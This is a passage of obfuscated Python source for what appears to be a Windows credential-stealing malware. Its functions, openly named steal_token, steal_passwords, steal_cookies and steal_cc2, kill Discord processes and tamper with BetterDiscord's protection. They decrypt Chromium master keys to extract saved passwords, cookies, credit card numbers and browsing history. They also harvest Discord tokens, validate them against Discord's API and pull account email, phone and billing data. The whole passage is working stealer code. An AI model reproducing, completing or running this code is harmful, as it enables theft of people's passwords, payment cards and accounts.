                O00O0O0OOOOOOO00O ['integrity_checkscripts']=False #line:586
                O00O0O0OOOOOOO00O ['integrity_checkresource']=False #line:587
                O00O0O0OOOOOOO00O ['integrity_redownloadhashes']=False #line:588
                O00O0O0OOOOOOO00O ['iterations_iv']=364 #line:589
                O00O0O0OOOOOOO00O ['iterations_key']=457 #line:590
                O00O0O0OOOOOOO00O ['version']=69420 #line:591
            with open (OO0O0OOO000OO0000 ,'w')as O0000OOOO000OO0O0 :#line:592
                json .dump (O00O0O0OOOOOOO00O ,O0000OOOO000OO0O0 ,indent =2 ,sort_keys =True )#line:593
            with open (OO0O0OOO000OO0000 ,'a')as O0000OOOO000OO0O0 :#line:594
                O0000OOOO000OO0O0 .write ("\n\n//zazaman4000_is_here | https://github.com/zazaman4000")#line:595
    async def kill_process_id (OO0OOO0OO0OO0O000 ):#line:597
        O0O0O00OOOO0O0000 =OO0OOO0OO0OO0O000 .fetch_conf ('blprggg')#line:598
        for O0O00OO00O000OO0O in ['discord','discordtokenprotector','discordcanary','discorddevelopment','discordptb']:#line:599
            O0O0O00OOOO0O0000 .append (O0O00OO00O000OO0O )#line:600
        for OO0O0000O0O00000O in psutil .process_iter ():#line:601
            if any (O00O0OOOO0OO00O0O in OO0O0000O0O00000O .name ().lower ()for O00O0OOOO0OO00O0O in O0O0O00OOOO0O0000 ):#line:602
                try :#line:603
                    OO0O0000O0O00000O .kill ()#line:604
                except (psutil .NoSuchProcess ,psutil .AccessDenied ):#line:605
                    pass #line:606
    async def bypass_bttdsc (OOOOO0OOOOOO0O00O ):#line:609
        OO00OO00O00O000O0 =OOOOO0OOOOOO0O00O .roaming +"\\BetterDiscord\\data\\betterdiscord.asar"#line:610
        if ntpath .exists (OO00OO00O00O000O0 ):#line:611
            OOO0O0O000000O0O0 =OOOOO0OOOOOO0O00O .regex_webhook_dsc #line:612
            with open (OO00OO00O00O000O0 ,'r',encoding ="cp437",errors ='ignore')as O000O0000O00O00OO :#line:613
                O0OO00O00OO00OOOO =O000O0000O00O00OO .read ()#line:614
                O0O0O0O00OOOOO00O =O0OO00O00OO00OOOO .replace (OOO0O0O000000O0O0 ,'KSCHishere')#line:615
            with open (OO00OO00O00O000O0 ,'w',newline ='',encoding ="cp437",errors ='ignore')as O000O0000O00O00OO :#line:616
                O000O0000O00O00OO .write (O0O0O0O00OOOOO00O )#line:617
    @extract_try #line:619
    def decrypt_val (OOOOO0O000O000O00 ,O0O0O00OO00O00000 ,OOOOO0OO00OO0O000 ):#line:620
        try :#line:621
            O0O0OO00O00O00OOO =O0O0O00OO00O00000 [3 :15 ]#line:622
            O0OO0OO00O0OOO00O =O0O0O00OO00O00000 [15 :]#line:623
            OOO00OO000O0O00OO =AES .new (OOOOO0OO00OO0O000 ,AES .MODE_GCM ,O0O0OO00O00O00OOO )#line:624
            OO00O00O00O0OO000 =OOO00OO000O0O00OO .decrypt (O0OO0OO00O0OOO00O )#line:625
            OO00O00O00O0OO000 =OO00O00O00O0OO000 [:-16 ].decode ()#line:626
            return OO00O00O00O0OO000 #line:627
        except Exception :#line:628
            return "Failed to decrypt password"#line:629
    def get_master_key (O00000000O0O0OO00 ,OOO0O00O0OOO0OOO0 ):#line:631
        with open (OOO0O00O0OOO0OOO0 ,"r",encoding ="utf-8")as O0OO00OO0O000OOO0 :#line:632
            OOOO000OO00000000 =O0OO00OO0O000OOO0 .read ()#line:633
        OO000O00OOO0OOOO0 =json .loads (OOOO000OO00000000 )#line:634
        O000000O00O0OO00O =base64 .b64decode (OO000O00OOO0OOOO0 ["os_crypt"]["encrypted_key"])#line:635
        O000000O00O0OO00O =O000000O00O0OO00O [5 :]#line:636
        O000000O00O0OO00O =CryptUnprotectData (O000000O00O0OO00O ,None ,None ,None ,0 )[1 ]#line:637
        return O000000O00O0OO00O #line:638
    def steal_token (OO000O000OO000OO0 ):#line:640
        O0O00OOO00OO0OOOO ={'Discord':OO000O000OO000OO0 .roaming +'\\discord\\Local Storage\\leveldb\\','Discord Canary':OO000O000OO000OO0 .roaming +'\\discordcanary\\Local Storage\\leveldb\\','Lightcord':OO000O000OO000OO0 .roaming +'\\Lightcord\\Local Storage\\leveldb\\','Discord PTB':OO000O000OO000OO0 .roaming +'\\discordptb\\Local Storage\\leveldb\\','Opera':OO000O000OO000OO0 .roaming +'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX':OO000O000OO000OO0 .roaming +'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo':OO000O000OO000OO0 .appdata +'\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch':OO000O000OO000OO0 .appdata +'\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa':OO000O000OO000OO0 .appdata +'\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum':OO000O000OO000OO0 .appdata +'\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser':OO000O000OO000OO0 .appdata +'\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star':OO000O000OO000OO0 .appdata +'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik':OO000O000OO000OO0 .appdata +'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi':OO000O000OO000OO0 .appdata +'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS':OO000O000OO000OO0 .appdata +'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome':OO000O000OO000OO0 .appdata +'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1':OO000O000OO000OO0 .appdata +'\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2':OO000O000OO000OO0 .appdata +'\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3':OO000O000OO000OO0 .appdata +'\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4':OO000O000OO000OO0 .appdata +'\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5':OO000O000OO000OO0 .appdata +'\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser':OO000O000OO000OO0 .appdata +'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge':OO000O000OO000OO0 .appdata +'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\','Uran':OO000O000OO000OO0 .appdata +'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex':OO000O000OO000OO0 .appdata +'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave':OO000O000OO000OO0 .appdata +'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium':OO000O000OO000OO0 .appdata +'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}#line:668
        for OO0O00O000000OOOO ,OO0O00O0OOO0O000O in O0O00OOO00OO0OOOO .items ():#line:670
            if not os .path .exists (OO0O00O0OOO0O000O ):#line:671
                continue #line:672
            O0O0OOOO00O0OOOO0 =OO0O00O000000OOOO .replace (" ","").lower ()#line:673
            if "cord"in OO0O00O0OOO0O000O :#line:674
                if os .path .exists (OO000O000OO000OO0 .roaming +f'\\{O0O0OOOO00O0OOOO0}\\Local State'):#line:675
                    for OOOOOOOOO0O00O0O0 in os .listdir (OO0O00O0OOO0O000O ):#line:676
                        if OOOOOOOOO0O00O0O0 [-3 :]not in ["log","ldb"]:#line:677
                            continue #line:678
                        for OO0OO0O000O0O000O in [O0O00O00O0O000O00 .strip ()for O0O00O00O0O000O00 in open (f'{OO0O00O0OOO0O000O}\\{OOOOOOOOO0O00O0O0}',errors ='ignore').readlines ()if O0O00O00O0O000O00 .strip ()]:#line:679
                            for OOOOOOOO000OO0OO0 in re .findall (OO000O000OO000OO0 .encrypted_regex ,OO0OO0O000O0O000O ):#line:680
                                try :#line:681
                                    O000OOO0O0O0O0OO0 =OO000O000OO000OO0 .decrypt_val (base64 .b64decode (OOOOOOOO000OO0OO0 .split ('dQw4w9WgXcQ:')[1 ]),OO000O000OO000OO0 .get_master_key (OO000O000OO000OO0 .roaming +f'\\{O0O0OOOO00O0OOOO0}\\Local State'))#line:682
                                except ValueError :#line:683
                                    pass #line:684
                                try :#line:685
                                    OO00O00O00O0OO00O =requests .get (OO000O000OO000OO0 .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':O000OOO0O0O0O0OO0 })#line:689
                                except Exception :#line:690
                                    pass #line:691
                                if OO00O00O00O0OO00O .status_code ==200 :#line:692
                                    OOOOOOO0OO00O0OO0 =OO00O00O00O0OO00O .json ()['id']#line:693
                                    if OOOOOOO0OO00O0OO0 not in OO000O000OO000OO0 .zg_id :#line:694
                                        OO000O000OO000OO0 .tokens .append (O000OOO0O0O0O0OO0 )#line:695
                                        OO000O000OO000OO0 .zg_id .append (OOOOOOO0OO00O0OO0 )#line:696
            else :#line:697
                for OOOOOOOOO0O00O0O0 in os .listdir (OO0O00O0OOO0O000O ):#line:698
                    if OOOOOOOOO0O00O0O0 [-3 :]not in ["log","ldb"]:#line:699
                        continue #line:700
                    for OO0OO0O000O0O000O in [OO0O0OOO000O000OO .strip ()for OO0O0OOO000O000OO in open (f'{OO0O00O0OOO0O000O}\\{OOOOOOOOO0O00O0O0}',errors ='ignore').readlines ()if OO0O0OOO000O000OO .strip ()]:#line:701
                        for O000OOO0O0O0O0OO0 in re .findall (OO000O000OO000OO0 .regex ,OO0OO0O000O0O000O ):#line:702
                            try :#line:703
                                OO00O00O00O0OO00O =requests .get (OO000O000OO000OO0 .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':O000OOO0O0O0O0OO0 })#line:707
                            except Exception :#line:708
                                pass #line:709
                            if OO00O00O00O0OO00O .status_code ==200 :#line:710
                                OOOOOOO0OO00O0OO0 =OO00O00O00O0OO00O .json ()['id']#line:711
                                if OOOOOOO0OO00O0OO0 not in OO000O000OO000OO0 .zg_id :#line:712
                                    OO000O000OO000OO0 .tokens .append (O000OOO0O0O0O0OO0 )#line:713
                                    OO000O000OO000OO0 .zg_id .append (OOOOOOO0OO00O0OO0 )#line:714
        if os .path .exists (OO000O000OO000OO0 .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:716
            for OO0O00O0OOO0O000O ,_OO0000O00O00O0OOO ,OO0O0OO000OOO00O0 in os .walk (OO000O000OO000OO0 .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:717
                for _O0000OO00OOOO00O0 in OO0O0OO000OOO00O0 :#line:718
                    if not _O0000OO00OOOO00O0 .endswith ('.sqlite'):#line:719
                        continue #line:720
                    for OO0OO0O000O0O000O in [OOOO0OOO0O00000O0 .strip ()for OOOO0OOO0O00000O0 in open (f'{OO0O00O0OOO0O000O}\\{_O0000OO00OOOO00O0}',errors ='ignore').readlines ()if OOOO0OOO0O00000O0 .strip ()]:#line:721
                        for O000OOO0O0O0O0OO0 in re .findall (OO000O000OO000OO0 .regex ,OO0OO0O000O0O000O ):#line:722
                            try :#line:723
                                OO00O00O00O0OO00O =requests .get (OO000O000OO000OO0 .baseurl ,headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type':'application/json','Authorization':O000OOO0O0O0O0OO0 })#line:727
                            except Exception :#line:728
                                pass #line:729
                            if OO00O00O00O0OO00O .status_code ==200 :#line:730
                                OOOOOOO0OO00O0OO0 =OO00O00O00O0OO00O .json ()['id']#line:731
                                if OOOOOOO0OO00O0OO0 not in OO000O000OO000OO0 .zg_id :#line:732
                                    OO000O000OO000OO0 .tokens .append (O000OOO0O0O0O0OO0 )#line:733
                                    OO000O000OO000OO0 .zg_id .append (OOOOOOO0OO00O0OO0 )#line:734
    def random_dir_create (O0O0O00O00O00OOO0 ,_dir :str or os .PathLike =gettempdir ()):#line:742
        O000000OOO00O0OOO =''.join (random .SystemRandom ().choice ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')for _O000OO0O00000O0OO in range (random .randint (10 ,20 )))#line:743
        OO0O00O0000OOOO0O =os .path .join (_dir ,O000000OOO00O0OOO )#line:744
        open (OO0O00O0000OOOO0O ,"x")#line:745
        return OO0O00O0000OOOO0O #line:746
    @extract_try #line:749
    def steal_passwords2 (O00O00O00OO0OOOO0 ,OOO0OOOOO0O0000O0 :str ,O00OO0O0O00O00000 :str ,OOO0000OO00O000OO :str ):#line:750
        O00OO0O0O00O00000 +='\\'+OOO0000OO00O000OO +'\\Login Data'#line:751
        if not os .path .isfile (O00OO0O0O00O00000 ):#line:752
            return #line:753
        OOO0O0OO0O0000OOO =O00O00O00OO0OOOO0 .random_dir_create ()#line:755
        copy2 (O00OO0O0O00O00000 ,OOO0O0OO0O0000OOO )#line:756
        OOO0O0OOO00OO0OOO =sqlite3 .connect (OOO0O0OO0O0000OOO )#line:757
        OO0000OOOOOO00OOO =OOO0O0OOO00OO0OOO .cursor ()#line:758
        with open (os .path .join (O00O00O00OO0OOOO0 .dir ,"Browsers","All Passwords.txt"),'a',encoding ="utf-8")as OOOO0O000000O0O00 :#line:759
            for OOOO0OO0OO0O0000O in OO0000OOOOOO00OOO .execute ("SELECT origin_url, username_value, password_value FROM logins").fetchall ():#line:760
                OOOO0O00O0O0OO0OO ,O00O0OOOO00O00O00 ,O0000O0O0OOOOO000 =OOOO0OO0OO0O0000O #line:761
                O0000O0O0OOOOO000 =O00O00O00OO0OOOO0 .dcrpt_val (O0000O0O0OOOOO000 ,O00O00O00OO0OOOO0 .masterkey )#line:762
                if OOOO0O00O0O0OO0OO !="":#line:763
                    OOOO0O000000O0O00 .write (f"URL: {OOOO0O00O0O0OO0OO}\nID: {O00O0OOOO00O00O00}\nPASSW0RD: {O0000O0O0OOOOO000}\n\n")#line:764
        OO0000OOOOOO00OOO .close ()#line:765
        OOO0O0OOO00OO0OOO .close ()#line:766
        os .remove (OOO0O0OO0O0000OOO )#line:767
    @extract_try #line:769
    def steal_cookies2 (O000O000000OO00OO ,O000O000O0000OOOO :str ,OO0O0O0OOO0OOO0OO :str ,O000O00O0O0OO0O0O :str ):#line:770
        OO0O0O0OOO0OOO0OO +='\\'+O000O00O0O0OO0O0O +'\\Network\\Cookies'#line:771
        if not os .path .isfile (OO0O0O0OOO0OOO0OO ):#line:772
            return #line:773
        O0000O0O0OO0OOOO0 =O000O000000OO00OO .random_dir_create ()#line:774
        copy2 (OO0O0O0OOO0OOO0OO ,O0000O0O0OO0OOOO0 )#line:775
        OOO0000OOO0O0OO0O =sqlite3 .connect (O0000O0O0OO0OOOO0 )#line:776
        O00OOO000OOOO0O00 =OOO0000OOO0O0OO0O .cursor ()#line:777
        with open (os .path .join (O000O000000OO00OO .dir ,"Browsers","All Cookies.txt"),'a',encoding ="utf-8")as OOO0O0O000000OOO0 :#line:778
            for O0O00OOO0OOOO0O0O in O00OOO000OOOO0O00 .execute ("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall ():#line:779
                O00O0000OO0OOO0O0 ,O000O000O0000OOOO ,OO0O0O0OOO0OOO0OO ,O0000OO0OOOOOO00O ,OO000OO00O0O0OOOO =O0O00OOO0OOOO0O0O #line:780
                OOOO000OOOOO0O000 =O000O000000OO00OO .dcrpt_val (O0000OO0OOOOOO00O ,O000O000000OO00OO .masterkey )#line:781
                if O00O0000OO0OOO0O0 and O000O000O0000OOOO and OOOO000OOOOO0O000 !="":#line:782
                    OOO0O0O000000OOO0 .write ("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format (O00O0000OO0OOO0O0 ,'FALSE'if OO000OO00O0O0OOOO ==0 else 'TRUE',OO0O0O0OOO0OOO0OO ,'FALSE'if O00O0000OO0OOO0O0 .startswith ('.')else 'TRUE',OO000OO00O0O0OOOO ,O000O000O0000OOOO ,OOOO000OOOOO0O000 ))#line:784
        O00OOO000OOOO0O00 .close ()#line:785
        OOO0000OOO0O0OO0O .close ()#line:786
        os .remove (O0000O0O0OO0OOOO0 )#line:787
    @extract_try #line:796
    def steal_passwords (OOOO00O00OO00O0OO ):#line:797
        O0OOOOO0O0OOOO0OO =open (ntpath .join (OOOO00O00OO00O0OO .dir ,'Google','Passwords.txt'),'w',encoding ="cp437",errors ='ignore')#line:798
        for O0O00OOO0OO0OOOOO in os .listdir (OOOO00O00OO00O0OO .chrmmuserdtt ):#line:799
            if re .match (OOOO00O00OO00O0OO .chrmrgx ,O0O00OOO0OO0OOOOO ):#line:800
                O00OOO00OOO00O000 =ntpath .join (OOOO00O00OO00O0OO .chrmmuserdtt ,O0O00OOO0OO0OOOOO ,'Login Data')#line:801
                OO00O0OO00O0O00O0 =OOOO00O00OO00O0OO .cr34t3_f1lkes ()#line:802
                shutil .copy2 (O00OOO00OOO00O000 ,OO00O0OO00O0O00O0 )#line:804
                OO00000O0OO0O00OO =sqlite3 .connect (OO00O0OO00O0O00O0 )#line:805
                O0OO00O0OOO00OO0O =OO00000O0OO0O00OO .cursor ()#line:806
                O0OO00O0OOO00OO0O .execute ("SELECT action_url, username_value, password_value FROM logins")#line:807
                for OO0O0000O0O0O0000 in O0OO00O0OOO00OO0O .fetchall ():#line:809
                    OO0O000OOOO0O00OO =OO0O0000O0O0O0000 [0 ]#line:810
                    OO0O0OO0OO0OO00O0 =OO0O0000O0O0O0000 [1 ]#line:811
                    O000O0O0OOO000OOO =OO0O0000O0O0O0000 [2 ]#line:812
                    OO0O0OO0OOOOOO00O =OOOO00O00OO00O0OO .dcrpt_val (O000O0O0OOO000OOO ,OOOO00O00OO00O0OO .chrome_key )#line:813
                    if OO0O000OOOO0O00OO !="":#line:814
                        O0OOOOO0O0OOOO0OO .write (f"URL: {OO0O000OOOO0O00OO}\nID: {OO0O0OO0OO0OO00O0}\nPASSW0RD: {OO0O0OO0OOOOOO00O}\n\n")#line:815
                O0OO00O0OOO00OO0O .close ()#line:817
                OO00000O0OO0O00OO .close ()#line:818
                os .remove (OO00O0OO00O0O00O0 )#line:819
        O0OOOOO0O0OOOO0OO .close ()#line:820
    @extract_try #line:824
    def steal_cookies (O0OOO00OOO00O00O0 ):#line:825
        O0O0O00OO00OOO0OO =open (ntpath .join (O0OOO00OOO00O00O0 .dir ,'Google','Cookies.txt'),'w',encoding ="cp437",errors ='ignore')#line:826
        for OO0O00O000O00O000 in os .listdir (O0OOO00OOO00O00O0 .chrmmuserdtt ):#line:827
            if re .match (O0OOO00OOO00O00O0 .chrmrgx ,OO0O00O000O00O000 ):#line:829
                OO0O0O00O0O00O000 =ntpath .join (O0OOO00OOO00O00O0 .chrmmuserdtt ,OO0O00O000O00O000 ,'Network','cookies')#line:831
                OOO000OO00O0OOO0O =O0OOO00OOO00O00O0 .cr34t3_f1lkes ()#line:832
                shutil .copy2 (OO0O0O00O0O00O000 ,OOO000OO00O0OOO0O )#line:835
                OOO0O0000O000000O =sqlite3 .connect (OOO000OO00O0OOO0O )#line:836
                O0OOOO00O0OOO0000 =OOO0O0000O000000O .cursor ()#line:837
                O0OOOO00O0OOO0000 .execute ("SELECT host_key, name, encrypted_value from cookies")#line:838
                for O0000000000OOOO00 in O0OOOO00O0OOO0000 .fetchall ():#line:840
                    OO0O0OO0000OOOOOO =O0000000000OOOO00 [0 ]#line:841
                    OOO0O000O0OOO000O =O0000000000OOOO00 [1 ]#line:842
                    O00OO00OO0O0OO00O =O0OOO00OOO00O00O0 .dcrpt_val (O0000000000OOOO00 [2 ],O0OOO00OOO00O00O0 .chrome_key )#line:843
                    if OO0O0OO0000OOOOOO !="":#line:844
                        O0O0O00OO00OOO0OO .write (f"{OO0O0OO0000OOOOOO}	TRUE"+"		"+f"/FALSE	2597573456	{OOO0O000O0OOO000O}	{O00OO00OO0O0OO00O}\n")#line:845
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'in O00OO00OO0O0OO00O :#line:846
                        O0OOO00OOO00O00O0 .robloxcookies .append (O00OO00OO0O0OO00O )#line:847
                O0OOOO00O0OOO0000 .close ()#line:849
                OOO0O0000O000000O .close ()#line:850
                os .remove (OOO000OO00O0OOO0O )#line:851
        O0O0O00OO00OOO0OO .close ()#line:852
    def steal_history2 (OOOO000O00O00O00O ,O000OO0OOOO000OO0 :str ,OO000O0O00O0000OO :str ,OOO0O0O0O00O00O00 :str ):#line:854
        OO000O0O00O0000OO +='\\'+OOO0O0O0O00O00O00 +'\\History'#line:855
        if not os .path .isfile (OO000O0O00O0000OO ):#line:856
            return #line:857
        OOO0O0O00OO00OO0O =OOOO000O00O00O00O .random_dir_create ()#line:858
        copy2 (OO000O0O00O0000OO ,OOO0O0O00OO00OO0O )#line:859
        O00O000OO000O0O00 =sqlite3 .connect (OOO0O0O00OO00OO0O )#line:860
        OOO0O0O00000O00O0 =O00O000OO000O0O00 .cursor ()#line:861
        with open (os .path .join (OOOO000O00O00O00O .dir ,"Browsers","All History.txt"),'a',encoding ="utf-8")as OO00OOO00OO0O0O00 :#line:862
            OO00OO0OO00OO0OO0 =[]#line:863
            for O0O0000O0OO0OO000 in OOO0O0O00000O00O0 .execute ("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall ():#line:864
                O0000OOOO0000O0O0 ,OO00O000OOOO000O0 ,O00OO000O000000O0 ,O00OOO0000OO0OO00 =O0O0000O0OO0OO000 #line:865
                if O0000OOOO0000O0O0 and OO00O000OOOO000O0 and O00OO000O000000O0 and O00OOO0000OO0OO00 !="":#line:866
                    OO00OO0OO00OO0OO0 .append ((O0000OOOO0000O0O0 ,OO00O000OOOO000O0 ,O00OO000O000000O0 ,O00OOO0000OO0OO00 ))#line:867
            OO00OO0OO00OO0OO0 .sort (key =lambda OO0OOO0O00OO00OOO :OO0OOO0O00OO00OOO [3 ],reverse =True )#line:868
            for OOOO0OOO00OO00OO0 in OO00OO0OO00OO0OO0 :#line:869
                OO00OOO00OO0O0O00 .write ("Visit Count: {:<6} Title: {:<40}\n".format (OOOO0OOO00OO00OO0 [2 ],OOOO0OOO00OO00OO0 [1 ]))#line:870
        OOO0O0O00000O00O0 .close ()#line:871
        O00O000OO000O0O00 .close ()#line:872
        os .remove (OOO0O0O00OO00OO0O )#line:873
    def steal_cc2 (O0O000O0O0O0OOO00 ,OOO00O00O0OOOOOOO :str ,OO0O0O000000O0O00 :str ,O000OO00O00OO00OO :str ):#line:875
        OO0O0O000000O0O00 +='\\'+O000OO00O00OO00OO +'\\Web Data'#line:876
        if not os .path .isfile (OO0O0O000000O0O00 ):#line:877
            return #line:878
        OOO00OOOOOOOO000O =O0O000O0O0O0OOO00 .random_dir_create ()#line:879
        copy2 (OO0O0O000000O0O00 ,OOO00OOOOOOOO000O )#line:880
        O00OOO000OOOOO000 =sqlite3 .connect (OOO00OOOOOOOO000O )#line:881
        O00O000O0000OO00O =O00OOO000OOOOO000 .cursor ()#line:882
        with open (os .path .join (O0O000O0O0O0OOO00 .dir ,"Browsers","All Creditcards.txt"),'a',encoding ="utf-8")as OOOOO0000O0OO0O0O :#line:883
            for O00O0O00O0O00O000 in O00O000O0000OO00O .execute ("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall ():#line:884
                O0000OOO0O0OOO0OO ,O000O0000O00O0O00 ,OOO00OO00O0000000 ,O0OO0OO0O0O000OO0 =O00O0O00O0O00O000 #line:885
                if O0000OOO0O0OOO0OO and O0OO0OO0O0O000OO0 !="":#line:886
                    OOOOO0000O0OO0O0O .write (f"Name: {O0000OOO0O0OOO0OO}   Expiration Month: {O000O0000O00O0O00}   Expiration Year: {OOO00OO00O0000000}   Card Number: {O0O000O0O0O0OOO00.dcrpt_val(O0OO0OO0O0O000OO0, O0O000O0O0O0OOO00.masterkey)}\n")#line:888
        OOOOO0000O0OO0O0O .close ()#line:889
        O00O000O0000OO00O .close ()#line:890
        O00OOO000OOOOO000 .close ()#line:891
        os .remove (OOO00OOOOOOOO000O )#line:892
    @extract_try #line:895
    def steal_history (O00OO0OOOOO0O0O0O ):#line:896
        OO0000000000O000O =open (ntpath .join (O00OO0OOOOO0O0O0O .dir ,'Google','History.txt'),'w',encoding ="cp437",errors ='ignore')#line:897
        def O0O00O00OOO0O0000 (O0OOOO00OO0OO00O0 ):#line:899
            O00OOOO0O0OO00O0O =""#line:900
            O0OOOO00OO0OO00O0 .execute ('SELECT title, url, last_visit_time FROM urls')#line:901
            for OOO00O0O0O0OO00OO in O0OOOO00OO0OO00O0 .fetchall ():#line:902
                O00OOOO0O0OO00O0O +=f"Search Title: {OOO00O0O0O0OO00OO[0]}\nURL: {OOO00O0O0O0OO00OO[1]}\nLAST VISIT TIME: {O00OO0OOOOO0O0O0O.cnverttim(OOO00O0O0O0OO00OO[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"#line:903
            return O00OOOO0O0OO00O0O #line:904
        def O00O00O0O0OOOOOO0 (OO0OO000OO0O0O0O0 ):#line:907
            OO0OO000OO0O0O0O0 .execute ('SELECT term FROM keyword_search_terms')#line:908
            O00OO0O0O00000O00 =""#line:909
            for OO0OO0OO0O0O0OO00 in OO0OO000OO0O0O0O0 .fetchall ():#line:911
                if OO0OO0OO0O0O0OO00 [0 ]!="":#line:912
                    O00OO0O0O00000O00 +=f"{OO0OO0OO0O0O0OO00[0]}\n"#line:913
            return O00OO0O0O00000O00 #line:915
        for O000000O00OO0O00O in os .listdir (O00OO0OOOOO0O0O0O .chrmmuserdtt ):#line:918
            if re .match (O00OO0OOOOO0O0O0O .chrmrgx ,O000000O00OO0O00O ):#line:920
                OO000O0O0O0000000 =ntpath .join (O00OO0OOOOO0O0O0O .chrmmuserdtt ,O000000O00OO0O00O ,'History')#line:922
                O000O000O0O00OO0O =O00OO0OOOOO0O0O0O .cr34t3_f1lkes ()#line:923
                shutil .copy2 (OO000O0O0O0000000 ,O000O000O0O00OO0O )#line:925
                OOO000O0OO0000OOO =sqlite3 .connect (O000O000O0O00OO0O )#line:926
                O0000OO0O0OO00O0O =OOO000O0OO0000OOO .cursor ()#line:927
                O000O0O0O00000OOO =O00O00O0O0OOOOOO0 (O0000OO0O0OO00O0O )#line:930
                OOOO00O000OO0O0O0 =O0O00O00OOO0O0000 (O0000OO0O0OO00O0O )#line:931
                OO0000000000O000O .write (f"{' '*17}SEARCH\n{'-'*50}\n{O000O0O0O00000OOO}\n{' '*17}\n\nLinks History\n{'-'*50}\n{OOOO00O000OO0O0O0}")#line:933
                O0000OO0O0OO00O0O .close ()#line:935
                OOO000O0OO0000OOO .close ()#line:936
                os .remove (O000O000O0O00OO0O )#line:937
        OO0000000000O000O .close ()#line:938
    def natify_matched_tokens (O0OOO0O00OO00000O ):#line:941
        OOOOOOOOO000O0O0O =open (O0OOO0O00OO00000O .dir +"\\Discord_Info.txt","w",encoding ="cp437",errors ='ignore')#line:943
        for OO0O0OO0O000O0OOO in O0OOO0O00OO00000O .tokens :#line:945
            OO0OO0O0O0OOOOOOO =httpx .get (O0OOO0O00OO00000O .dscap1 ,headers =O0OOO0O00OO00000O .g3t_H (OO0O0OO0O000O0OOO )).json ()#line:946
            O0O0O00O00O000O0O =OO0OO0O0O0OOOOOOO .get ('username')+'#'+str (OO0OO0O0O0OOOOOOO .get ("discriminator"))#line:947
            O0OO00000OOO0OO0O =""#line:949
            OOOOO00O000OOO000 =OO0OO0O0O0OOOOOOO ['flags']#line:950
            if (OOOOO00O000OOO000 ==1 ):#line:951
                O0OO00000OOO0OO0O +="Staff, "#line:952
            if (OOOOO00O000OOO000 ==2 ):#line:953
                O0OO00000OOO0OO0O +="Partner, "#line:954
            if (OOOOO00O000OOO000 ==4 ):#line:955
                O0OO00000OOO0OO0O +="Hypesquad Event, "#line:956
            if (OOOOO00O000OOO000 ==8 ):#line:957
                O0OO00000OOO0OO0O +="Green Bughunter, "#line:958
            if (OOOOO00O000OOO000 ==64 ):#line:959
                O0OO00000OOO0OO0O +="Hypesquad Bravery, "#line:960
            if (OOOOO00O000OOO000 ==128 ):#line:961
                O0OO00000OOO0OO0O +="HypeSquad Brillance, "#line:962
            if (OOOOO00O000OOO000 ==256 ):#line:963
                O0OO00000OOO0OO0O +="HypeSquad Balance, "#line:964
            if (OOOOO00O000OOO000 ==512 ):#line:965
                O0OO00000OOO0OO0O +="Early Supporter, "#line:966
            if (OOOOO00O000OOO000 ==16384 ):#line:967
                O0OO00000OOO0OO0O +="Gold BugHunter, "#line:968
            if (OOOOO00O000OOO000 ==131072 ):#line:969
                O0OO00000OOO0OO0O +="Verified Bot Developer, "#line:970
            if (OOOOO00O000OOO000 ==4194304 ):#line:971
                O0OO00000OOO0OO0O +="Active Developer, "#line:972
            if (O0OO00000OOO0OO0O ==""):#line:973
                O0OO00000OOO0OO0O ="None"#line:974
            OOO0O000O0O0OOOOO =OO0OO0O0O0OOOOOOO .get ("email")#line:976
            O0OOOO0O00O00OO00 =OO0OO0O0O0OOOOOOO .get ("phone")if OO0OO0O0O0OOOOOOO .get ("phone")else "No Phone Number attached"#line:977
            OO000O00000O00O0O =httpx .get (O0OOO0O00OO00000O .dscap1 +'/billing/subscriptions',headers =O0OOO0O00OO00000O .g3t_H (OO0O0OO0O000O0OOO )).json ()#line:978
